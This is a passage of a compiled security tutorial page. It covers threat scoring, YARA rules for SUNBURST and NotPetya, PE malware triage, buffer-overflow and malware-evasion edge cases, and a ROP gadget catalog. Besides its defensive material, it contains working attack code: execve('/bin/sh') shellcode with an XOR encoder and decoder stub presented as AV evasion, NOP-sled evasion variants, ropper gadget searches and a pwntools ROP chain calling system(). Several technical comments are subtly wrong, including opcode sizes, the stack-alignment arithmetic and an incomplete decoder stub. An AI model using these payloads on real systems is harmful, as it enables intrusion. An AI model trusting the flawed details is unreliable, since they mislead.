          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Threat"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Damage"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Reproducibility"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Exploitability"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Affected"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Discoverability"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Total"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "SQLi price manipulation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "10"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "10"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "8"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "10"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "9"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "47/50"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Admin privilege escalation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "10"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "5"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "5"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "10"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "7"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "37/50"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Session hijacking"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "8"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "6"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "7"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "9"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "8"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "38/50"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "DDoS"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "7"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "10"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "8"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "10"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "8"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "43/50"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "extended-malware-analysis-yara-rules",
      children: "Extended Malware Analysis: YARA Rules"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "creating-yara-rules-for-malware-detection",
      children: "Creating YARA Rules for Malware Detection"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-yara",
        children: "// solarwinds_malware.yar\nrule SUNBURST_Backdoor {\n    meta:\n        description = \"Detect SolarWinds SUNBURST backdoor DLL\"\n        author = \"Security Analyst\"\n        reference = \"CISA AA20-352A\"\n        hash = \"b91d9dce4cb6a0d769b8ea2d9e3a8d0e\"\n\n    strings:\n        $s1 = \"SolarWinds.Orion.Core.BusinessLayer.OrionImprovementBusinessLayer\"\n        $s2 = \"OrionImprovementBusinessLayer\"\n        $s3 = \"HTTP/1.1\" wide\n        $s4 = \"Microsoft-Server-Activation-Via-MS\" wide\n        $s5 = \"solarwinds.com\" wide\n\n    condition:\n        uint16(0) == 0x5A4D and           // MZ header\n        all of ($s1, $s2, $s3) and\n        2 of ($s4, $s5)\n}\n\nrule NotPetya_Wiper {\n    meta:\n        description = \"Detect NotPetya ransomware/wiper\"\n        reference = \"CERT-UA No. 1379\"\n\n    strings:\n        $mbr = { 48 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 }\n        $s1  = \"Ooops, your important files are encrypted.\" wide\n        $xor_key = { 7C 52 B5 3A 96 B7 B7 E8 }\n\n    condition:\n        ($mbr at 0) or\n        ($s1 at 0) and\n        #s1 > 0\n}\n\nrule Generic_Shellcode {\n    meta:\n        description = \"Detect common x86 NOP sled + execve shellcode\"\n    strings:\n        $nop_sled = { 90 90 90 90 90 90 90 90 }\n        $execve_1 = { 31 C0 B0 0B 31 DB 31 C9 31 D2 CD 80 }\n        $execve_2 = { 31 C0 50 68 2F 2F 73 68 68 2F 62 69 6E 89 E3 50 53 89 E1 B0 0B CD 80 }\n        $msf_tcp  = { 6A 02 89 E1 6A 66 58 89 44 24 ?? CD 80 }\n\n    condition:\n        $nop_sled and (any of ($execve_*)) or ($msf_tcp)\n}\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "running-yara-scan",
      children: "Running YARA Scan"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Scan a directory with all rules\nyara -r -s solarwinds_malware.yar C:\\samples\\\n\n# Scan with multiple rule files\nyara -r rules/*.yar suspicious_file.exe\n\n# Output\nSUNBURST_Backdoor C:\\samples\\SolarWinds.Orion.Core.BusinessLayer.dll\n0x1a340:$s1: SolarWinds.Orion.Core.BusinessLayer.OrionImprovementBusinessLayer\n0x2f100:$s2: OrionImprovementBusinessLayer\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "extended-practical-hashdiff-and-pe-analysis-walkthrough",
      children: "Extended Practical: HashDiff and PE Analysis Walkthrough"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "complete-pe-analysis-workflow",
      children: "Complete PE Analysis Workflow"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-powershell",
        children: "# ============ STEP 1: Initial Triage ============\n# Get file metadata\nGet-Item .\\suspicious.exe | Format-List *\n$hash = Get-FileHash .\\suspicious.exe -Algorithm SHA256\nWrite-Host \"Hash: $($hash.Hash)\"\n# -> Check against VirusTotal API\n\n# ============ STEP 2: Digital Signature Check ============\n# Sysinternals Sigcheck\nsigcheck -a -h suspicious.exe\n\n# Output:\n# Signed:    Unsigned\n# Publisher: <none>\n# Description:  <none>\n# File Version: 1.0.0.0\n# Original Name: NOT suspicious.exe (should match filename)\n# Entropy:  7.98 (HIGH → packed/encrypted)\n\n# ============ STEP 3: String Analysis ============\n# Sysinternals Strings\nstrings.exe -n 8 suspicious.exe | Select-String -Pattern \"http|https|cmd|powershell|encrypt|decrypt|C2|server|socket|connect\"\n\n# Output:\n# http://185.234.72.18/update.php\n# cmd.exe /c %s\n# powershell -enc\n# SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n# CreateRemoteThread\n# VirtualAllocEx\n# WriteProcessMemory\n\n# ============ STEP 4: Import Analysis with PowerShell ============\n# Check suspicious imports\n$bytes = [System.IO.File]::ReadAllBytes(\".\\suspicious.exe\")\n# PE offset is at 0x3C\n$peOffset = [System.BitConverter]::ToUInt32($bytes, 0x3C)\nWrite-Host \"PE Header at: 0x$($peOffset.ToString('X'))\"\n\n# IMAGE_FILE_HEADER at peOffset+4\n$machine = [System.BitConverter]::ToUInt16($bytes, $peOffset + 4)\nWrite-Host \"Machine: 0x$($machine.ToString('X'))\"  # 0x14C = i386, 0x8664 = x64\n\n# ============ STEP 5: HashDiff ============\n# Compare with known clean version\n$cleanHash = (Get-FileHash .\\clean_version.dll -Algorithm MD5).Hash\n$suspectHash = (Get-FileHash .\\suspicious.dll -Algorithm MD5).Hash\n\nif ($cleanHash -ne $suspectHash) {\n    Write-Host \"WARNING: DLL has been modified!\"\n    Write-Host \"Clean:    $cleanHash\"\n    Write-Host \"Suspect:  $suspectHash\"\n}\n\n# ============ STEP 6: Import Diff with PEStudio ============\n# (Manual instructions if PEStudio not installed)\nWrite-Host @\"\nCheck these PEStudio indicators:\n1. Sections with entropy > 7.0\n2. Suspicious imports (VirtualAlloc, CreateRemoteThread, etc.)\n3. TLS callbacks (anti-debugging)\n4. Rich header mismatch (masquerading)\n5. Non-standard section names (.text, .data, .rdata are normal)\n\"@\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "extended-edge-cases-and-corner-cases",
      children: "Extended Edge Cases and Corner Cases"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "buffer-overflow-edge-cases",
      children: "Buffer Overflow Edge Cases"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "#"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Edge Case"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Behavior"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Exploitation Impact"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "1"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Overflow of exactly 1 byte past buffer"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Overwrites lowest byte of saved EBP → triggers stack frame shift (\"EBP off-by-one\" or \"poisoned null byte\")"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Can redirect frame pointer to controlled stack area"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "2"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Buffer allocated on heap with function pointer after it"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Overflow corrupts function pointer, not return address"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "No stack canary protection; arbitrary call on next fnptr dereference"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "3"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Unicode/wide character overflow"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsx)(_components.code, {
              children: "wcscpy"
            }), " copies 2-byte characters; overflow measured in wchar_t units"]
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Different offset calculation; may embed null bytes differently"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "4"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Stack clash (CVE-2017-1000364)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Stack grows into another memory region (heap/mmap)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Bypasses guard page; heap areas become stack-contiguous"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "5"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Variable-length array (VLA) on stack"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Array size computed at runtime from user input"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Can allocate massive stack frames; smash the stack without strcpy"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "6"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Alloca with negative value"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsx)(_components.code, {
              children: "alloca(-1)"
            }), " acts as ", (0,jsx_runtime.jsx)(_components.code, {
              children: "alloca(0xFFFFFFFF)"
            }), " → wraps and allocates tiny buffer"]
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Massive overflow on subsequent write"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "7"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Off-by-one null byte (as in glibc malloc)"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsx)(_components.code, {
              children: "strncpy"
            }), " leaves buffer non-null-terminated if source >= n; subsequent ", (0,jsx_runtime.jsx)(_components.code, {
              children: "strlen"
            }), " reads beyond"]
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Information leak via adjacent memory"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "8"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "sigaltstack overflow"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Overflows alternate signal stack (sigaltstack)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Corrupts signal handler frame; can hijack execution during signal delivery"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "malware-edge-cases",
      children: "Malware Edge Cases"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "#"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Edge Case"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Behavior"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Analysis Impact"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "1"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Time-based evasion (sleep 2 weeks)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Malware remains dormant before activating"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Sandbox timeout bypass; need long-running analysis"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "2"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "VM/hypervisor detection"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Checks MAC prefix (00:0C:29, 00:50:56), registry keys, hardware IDs"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Static analysis required; behavioral sandboxes fail"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "3"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Anti-debugging (TLS callback, IsDebuggerPresent)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Terminates or changes behavior when debugger detected"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Need hardware breakpoints, kernel-mode debugging"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "4"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Domain generation algorithm (DGA)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "C2 domains computed from date/seed; thousands of possible domains"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Need DNS sinkhole, reverse engineer algorithm"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "5"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Polymorphic code (changes each infection)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Each sample has different byte sequence but same functionality"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Signature-based AV fails; behavior-based detection needed"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "6"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Reflective DLL injection"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Loads DLL from memory, not disk (no file to scan)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Memory forensics required; file scanners miss it"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "7"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Process hollowing"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Creates legitimate process (svchost.exe), unmaps its code, injects malicious code"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Process tree anomaly detection; parent-child relationship analysis"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "8"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Living-off-the-land (LOLBins)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Uses only built-in tools (powershell, wmic, mshta)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Whitelisting (AppLocker) only defense; no new binaries to detect"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "extended-nop-sled-and-shellcode-encoding-variants",
      children: "Extended NOP Sled and Shellcode Encoding Variants"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "nop-sled-variations",
      children: "NOP Sled Variations"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-nasm",
        children: "; Standard NOP (0x90) → easily signatured\nnop\n\n; Multi-byte NOP equivalents (AV/IDS evasion)\nxchg eax, eax     ; 0x87 0xC0 → does nothing (same as NOP on most CPUs)\nmov eax, eax      ; 0x89 0xC0 → no-op\n\n; Using lea as NOP (common in compiler output)\nlea esi, [esi]    ; 0x8D 0x36\nlea edi, [edi]    ; 0x8D 0x3F\n\n; 2-byte NOPs\nxchg eax, ecx     ; 0x91\nxchg eax, edx     ; 0x92\nxchg eax, ebx     ; 0x93\n\n; Random NOP-like instructions (for polymorphic sleds)\ninc ecx           ; 0x41 → changes ecx but if ecx not used, harmless\ndec ecx           ; 0x49 → reverses inc\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "shellcode-encoding-with-custom-xor",
      children: "Shellcode Encoding with Custom XOR"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-c",
        children: "#include <stdio.h>\n#include <stdint.h>\n#include <string.h>\n\n// Original shellcode: execve(\"/bin/sh\", 0, 0) → 23 bytes\nunsigned char shellcode[] = \n\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\"\n\"\\x53\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\"\n\"\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80\";\n\n// Encoder: XOR each byte with a key, skip null bytes\nvoid encode_xor(unsigned char *data, int len, unsigned char key) {\n    for (int i = 0; i < len; i++) {\n        unsigned char encoded = data[i] ^ key;\n        // If encoded byte is a bad char (null, newline, etc.), adjust\n        if (encoded == 0x00 || encoded == 0x0a || encoded == 0x0d) {\n            // Use a different encoding for this byte (e.g., add key then XOR)\n            // In practice, might use incremental keys or multi-byte XOR\n            encoded = (data[i] + 0x22) ^ key;\n        }\n        data[i] = encoded;\n    }\n}\n\n// Decoder stub (assembly → prepended to encoded shellcode)\nunsigned char decoder_stub[] = \n\"\\x5e\"                    // pop esi → get address of encoded shellcode\n\"\\x31\\xc9\"                // xor ecx, ecx → counter\n\"\\xb1\\x17\"                // mov cl, 23 → length of shellcode\n\"\\x80\\x34\\x0e\\xaa\"        // xor byte [esi+ecx], 0xaa → XOR decode with 0xAA\n\"\\xe2\\xfa\"                // loop back to decode\n\"\\xff\\xe6\"                // jmp esi → jump to decoded shellcode\n;\n\nint main() {\n    printf(\"Original shellcode (%lu bytes):\\n\", sizeof(shellcode)-1);\n    for (int i = 0; i < sizeof(shellcode)-1; i++)\n        printf(\"\\\\x%02x\", shellcode[i]);\n    printf(\"\\n\");\n\n    encode_xor(shellcode, sizeof(shellcode)-1, 0xAA);\n    printf(\"Encoded shellcode:\\n\");\n    for (int i = 0; i < sizeof(shellcode)-1; i++)\n        printf(\"\\\\x%02x\", shellcode[i]);\n    printf(\"\\n\");\n\n    printf(\"Full payload (decoder + encoded): %lu bytes\\n\",\n           sizeof(decoder_stub) + sizeof(shellcode)-1);\n    return 0;\n}\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "extended-malware-defenses-comparison",
      children: "Extended Malware Defenses Comparison"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Defense"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "What It Blocks"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "How"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Bypass"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Deployment"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "AppLocker"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Unauthorized executables, scripts, MSI"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Path/Publisher/Hash rule"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "DLL side-loading, LOLBins"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Windows Enterprise/Education"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Windows Defender ASR"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Office child process, PS script execution, USB"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Attack Surface Reduction rules"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Disable if user is admin"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Windows 10/11 Pro+"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Windows Defender CFG"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "ROP (indirect call hijack)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Guard CFG table check per indirect call"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Corrupt valid function pointer"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Windows 8.1+"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Kernel DMA Protection"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "DMA attacks via Thunderbolt"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "IOMMU blocks unauthorized devices"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Physical access bypass"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Windows 10 1803+"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Credential Guard"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Pass-the-Hash, pass-the-Ticket"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Isolates credentials in VBS"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "No bypass known for LSA isolated"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Windows 10 Enterprise"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Secure Boot"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Bootkits, rootkits before OS"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Verify digital signature at each boot stage"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Disable in UEFI (requires physical access)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "UEFI firmware"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "extended-rop-gadget-catalog-x86_64",
      children: "Extended ROP Gadget Catalog (x86_64)"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "essential-gadgets-for-rop-chains",
      children: "Essential Gadgets for ROP Chains"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-asm",
        children: "; ==================== DATA MOVEMENT ====================\npop rax; ret              ; Load constant into rax\npop rdi; ret              ; Load constant into rdi (arg1)\npop rsi; ret              ; Load constant into rsi (arg2)\npop rdx; ret              ; Load constant into rdx (arg3)\npop rcx; ret              ; Load constant into rcx (arg4)\n\n; ==================== MEMORY READ/WRITE ====================\nmov rax, [rdi]; ret       ; Dereference rdi into rax (read arbitrary memory)\nmov [rdi], rax; ret       ; Write rax to address in rdi (write arbitrary memory)\nmov [rdi], rsi; ret       ; Write rsi to address in rdi\nxchg rax, rdi; ret        ; Swap rax and rdi\n\n; ==================== ARITHMETIC ====================\nadd rax, rdi; ret         ; rax = rax + rdi\nsub rax, rdi; ret         ; rax = rax - rdi\nxor rax, rax; ret         ; Zero rax\ninc rax; ret              ; Increment rax\ndec rax; ret              ; Decrement rax\n\n; ==================== SYSCALL ====================\nsyscall; ret              ; Execute syscall (rax = number, rdi/rsi/rdx/r10/r8/r9 = args)\n\n; ==================== STACK MANIPULATION ====================\nadd rsp, 0x20; ret        ; Skip 4 stack slots\nleave; ret                ; mov rsp, rbp; pop rbp; ret → restore frame\nret                       ; Pop next address and jump\n\n; ==================== LOOP/BRANCH ====================\njmp rax                   ; Jump to computed address (if address is known)\ncall rax                  ; Call function (preserves return address)\npush rax; ret             ; Jump to rax (alternative to jmp rax)\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "finding-specific-gadgets-with-ropper",
      children: "Finding Specific Gadgets with ropper"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Filter by instruction + constraints\nropper --file /usr/lib/x86_64-linux-gnu/libc.so.6 \\\n       --search \"mov qword ptr \\[rdi\\]\"\nropper --file libc.so.6 --search \"add eax\" --regex\n\n# Find gadgets by byte pattern\n# \"0f 05 c3\" = syscall; ret\n# \"ff e0\"    = jmp eax\nropper --file vuln --opbytes \"ff e0\"\n\n# Search for gadgets that avoid certain bad bytes\nropper --file libc.so.6 --search \"pop rdi\" --badbytes \"00\"\n\n# Find all unique gadgets for a binary\nropper --file vuln --all > all_gadgets.txt\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "stack-alignment-movaps-workaround",
      children: "Stack Alignment (movaps) Workaround"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-python",
        children: "from pwn import *\nimport struct\n\n# When calling system() on x86_64, the stack must be 16-byte aligned.\n# If the ROP chain doesn't maintain alignment, system() crashes on movaps.\n\n# Solution: insert a bare \"ret\" gadget before the target call.\n# ret pops 8 bytes → stack pointer advances 8 → alignment restored.\n\nret_addr = 0x400101  # address of a \"ret\" instruction\n\n# Off-alignment chain (crashes):\nchain_off = [\n    pop_rdi, bin_sh,  # 2 values on stack = 8 bytes pushed (off by 8)\n    system_addr       # movaps will fault\n]\n\n# Correct-alignment chain (works):\nchain_on = [\n    pop_rdi, bin_sh,  # 16 bytes total\n    ret_addr,         # extra ret pops 8 more = alignment restored\n    system_addr       # system() gets 16-byte aligned stack\n]\n\n# Another method: merge pop+call\nchain_alt = [\n    pop_rdi, bin_sh,\n    system_addr,\n    exit_addr,        # clean exit after shell, also fixes alignment indirectly\n]\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "extended-malware-analysis-memory-only-malware-detection",
